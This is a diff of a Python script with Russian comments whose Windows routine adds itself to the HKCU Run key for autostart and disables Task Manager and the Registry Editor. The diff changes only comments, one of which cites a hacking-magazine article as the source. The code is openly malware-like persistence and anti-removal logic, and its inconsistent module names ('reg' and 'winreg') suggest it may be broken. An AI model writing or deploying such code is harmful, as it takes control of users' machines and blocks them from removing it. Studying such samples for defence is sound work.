@@ -6,9 +6,9 @@ from winreg import *
 # Функция для установки на видовс, которая закидывает файл в реестр автозагрузок, блокирует доступ в реестр
 def win32():
     # Кидаем в автозагрузки
-    pth = os.path.dirname(os.path.realpath(__file__)) #--
-    p_name = "test_autorun.py"                        # Узнаем, где лежит файл, что указать до него путь
-    address = os.path.join(pth, p_name)               #--
+    pth = os.path.dirname(os.path.realpath(__file__)) # Узнаем, где лежит файл, что указать до него путь
+    p_name = "test_autorun.py"                        # Даем название программе
+    address = os.path.join(pth, p_name)               # Склеиваем путь до прогрммы и название, чтобы получить полный путь
     tmp = reg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
     winreg.SetValue(tmp, None, reg.REG_SZ, address)
     winreg.CloseKey(tmp)
@@ -22,7 +22,7 @@ def win32():
         key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
     except:
         key = CreateKey(HKEY_CURRENT_USER, keyVal)
-    SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)
+    SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1) # Как в статье на Хакере
     CloseKey(key)
     
     # Закрываем встроенный редактор реестра
@@ -31,7 +31,7 @@ def win32():
         key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
     except:
         key = CreateKey(HKEY_CURRENT_USER, keyVal)
-    SetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, 1)
+    SetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, 1) # Как в статье на Хакере
     CloseKey(key)
     
 def linux():
